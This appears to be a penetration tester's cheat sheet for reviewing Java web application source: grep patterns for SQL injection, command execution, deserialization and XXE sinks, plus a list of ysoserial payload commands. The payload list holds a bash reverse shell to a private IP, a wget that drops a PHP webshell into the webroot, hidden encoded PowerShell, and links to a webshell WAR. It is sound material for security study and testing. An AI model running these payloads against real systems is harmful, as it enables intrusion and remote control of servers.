    Structure:
        WAR contains multiple JARS (single application/libraries); EAR can contain multiple JARs and WARs to consolidate multiple web applications into a single file
        /APP-INF/lib may contain application JAR files; /BOOT-INF/lib/ inside the JAR file contains dependencies
        Important Files:  
            web.xml (config settings, servlet URL mappings, authenticated URLs, etc.)
                ex. C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\web.xml
            /META-INF/application.xml specifies where external application libraries are found in an EAR
                ex. <library-directory>APP-INF/lib</library-directory>
    *User-Supplied Data Interface:  javax.servlet.http.HttpServletRequest
        (doGet|doPost|doPut|doDelete|doCopy)
            Then look for: getParameter or getParameterValues
    Session Interaction:  javax.servlet.http.HttpSession
    File Interaction:  java.io.File class
        egrep -R 'File |File\(|FileInputStream|FileOutputStream|FileReader|FileWriter' .
        (File |File\(|FileInputStream|FileOutputStream|FileReader|FileWriter)
    SQLI Vulnerable Functions:  egrep -iR 'java\.sql\.Connection|java\.sql\.Statement' .
        egrep -R 'createStatement|execute\(|executeQuery' .
        (createStatement|execute\(|executeQuery)
        (executeQuery|java.sql.Statement.execute|java.sql.Statement.executeQuery|java.sql.Connection.createStatement)
        ^.*?query.*?select.*?  \\  ^.*?query.*?select.*?where.*?\+.*? 
    OS Commands:  egrep -R 'java\.lang\.runtime\.Runtime|getRuntime\(|exec\(|processbuilder|process' .
        (java\.lang\.runtime\.Runtime|getRuntime\(|exec\(|processbuilder|process)
        Injection characters: & && ; ' " | || >
    Troubleshooting:
        Interactive:  jshell
            ex. import java.util.Random; Random r1 = new Random(42); Random r2 = new Random(42); int x, y; for(int i=0; i<10; i++) { x = r1.nextInt(); y = r2.nextInt(); if(x == y){System.out.println("They match! " + x);}}; /exit   
        REVERSE SHELL ENCODING/TROUBLESHOOTING TOOL:
            https://web.archive.org/web/20211103090336/https://www.jackson-t.ca/runtime-exec-payloads.html
    ##Dangerous Function Search:  python3 javaid.py -d '/full/project/path'
    Deserialization:
        Indicator:  application/x-java-serialized-object HTTP header 
        Methods: Java.io.Serializable, readObject(), writeObject(), java.io.ObjectInputStream (deserializes), outputstream (serializes)
        Vulnerable Functions:  readObject()
            egrep -iR 'java.io.Serializable|Serial|InputStream|outputstream|readObject|writeobject|XMLdecoder|fromXML' .
            (java.io.Serializable|Serial|InputStream|outputstream|readObject|writeobject|XMLdecoder|fromXML)
            (.*readObject\(.*|java.beans.XMLDecoder|com.thoughtworks.xstream.XStream|.*\.fromXML\(.*\)|com.esotericsoftware.kryo.io.Input|.readClassAndObject\(.*|.readObjectOrNull\(.*|com.caucho.hessian.io|com.caucho.burlap.io.BurlapInput|com.caucho.burlap.io.BurlapOutput|org.codehaus.castor|Unmarshaller|jsonToJava\(.*|JsonObjectsToJava\/.*|JsonReader|ObjectMapper\(|enableDefaultTyping\(\s*\)|@JsonTypeInfo\(|readValue\(.*\,\s*Object\.class|com.alibaba.fastjson.JSON|JSON.parseObject|com.owlike.genson.Genson|useRuntimeType|genson.deserialize|org.red5.io|deserialize\(.*\,\s*Object\.class|\.Yaml|\.load\(.*|\.loadType\(.*\,\s*Object\.class|YamlReader|com.esotericsoftware.yamlbeans)
        Vulnerable Libraries:
            find . -iname "*commons*collection*"
            egrep -iR "AspectJWeaver|BeanShell1|C3P0|Click1|Clojure|CommonsBeanutils1|Commons.*Collection|FileUpload1|Groovy1|Hibernate|JBossInterceptors1|JRMPClient|JRMPListener|JSON1|JavassistWeld1|Jdk7u21|Jython1|MozillaRhino|Myfaces|ROME|Spring|URLDNS|Vaadin1|Wicket1" .
            (AspectJWeaver|BeanShell1|C3P0|Click1|Clojure|CommonsBeanutils1|Commons.*Collection|FileUpload1|Groovy1|Hibernate|JBossInterceptors1|JRMPClient|JRMPListener|JSON1|JavassistWeld1|Jdk7u21|Jython1|MozillaRhino|Myfaces|ROME|Spring|URLDNS|Vaadin1|Wicket1)
        Process:  After detection, look for gadgets--see what classes are available (or trial and error w/ ysoserial)
        Payloads:
            Try every gadget available!
            Java War Webshell:  https://github.com/tghosth/webshelljar/raw/master/webshell.war
            Classic ysoserial:
                ex. java -jar ysoserial.jar CommonsCollections1 "touch ./pwned.txt" > payload
                ex. java -jar ysoserial.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
                ex. java -jar ysoserial.jar CommonsCollections4 "ping -c 1 10.10.1.1" | base64 -w 0 | xclip -selection clipboard   -> then paste and right click url decode in burp
                ex. java -jar ysoserial.jar CommonsCollections3 "wget http://192.168.1.1/shell.php -O /var/www/html/shell.php" 
                ex. java -jar ysoserial.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ....."
                ex. java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,YmFza......}|{base64,-d}|{bash,-i}" | base64 -w0
                ex. java -jar yoserial.jar CommonsCollections1 "cmd /c calc.exe" | base64 -w 0
            Modified ysoserial (use for complex commands, pipes, etc.):
                ex. java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/192.168.1.1/4444 0>&1' > payload
                ex. java -jar ysoserial-modified.jar CommonsCollections5 cmd 'ping -n 2 192.168.1.1'
                ex. java -jar ysoserial-modified.jar CommonsCollections5 powershell 'ping -n 2 192.168.1.1'
            Base64 encode payload:  base64 -w0 payload
            Reverse Shell Troubleshooting:  https://web.archive.org/web/20211103090336/https://www.jackson-t.ca/runtime-exec-payloads.html
                Or use ysoserial-modified
                Test different types of rev shell payloads; try downloading shell and executing separately
    Insecure Random / Token Generation:
        Secure: java.security.SecureRandom
        Insecure: java.util.Random when using a predictable/repeatable seed value
            If two instances of Random are created with the same seed, and the same sequence of method calls is made for each, they will generate and return identical sequences of numbers
    Webshell:  /usr/share/webshells/jsp/cmdjsp.jsp   
    XXE:  grep -R "javax.xml.transform.Transformer" .
        Vulnerable library when created without enabling "Secure Processing" or when one is created without disabling resolving of both external DTDs and DTD entities.
        
    Java Approach:
        Prep:
            Use ProcExp, figure out which Java process to target; check properties for CWD
            Check mappings in Web.xml (in WEB-INF folder)
                shows servlets, which URLs require authentication, and other information, plus *URLs for each servlet
            Figure out which classes you want to review - look for JAR files (non-3rd party ones)
                ex. C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\lib
            Then decompile them with JD-GUI
            Transfer code to Notepad for searching:   File > Save All Sources -> Then use Find in Files (and select the unzipped folder)
        Analysis: 
            *Step 1: Check endpoints in web.xml, then start with notable JSP files
                ex. Starting with PasswordReset.jsp
                Look at custom imports
            *Method 1: Search for doGet and doPost functions that process user input before using it in a SQL query, etc.
                (doGet|doPost|doPut|doDelete|doCopy)
            Method 2: Search for server-side processing (SQL queries, etc.), then see what you can control
                See what syntax is used/how queries are formatted, then create expression:
                    ^.*?query.*?select.*?  \\  ^.*?query.*?select.*?where.*?\+.*?       
        .do extensions:  URL mapping scheme for compiled Java code
        Dependencies are in /BOOT-INF/lib/ inside the JAR file
            Import dependencies into VSCode:  ex. unzip -j NumberGame.jar "BOOT-INF/lib/*" -d NumberGame/lib/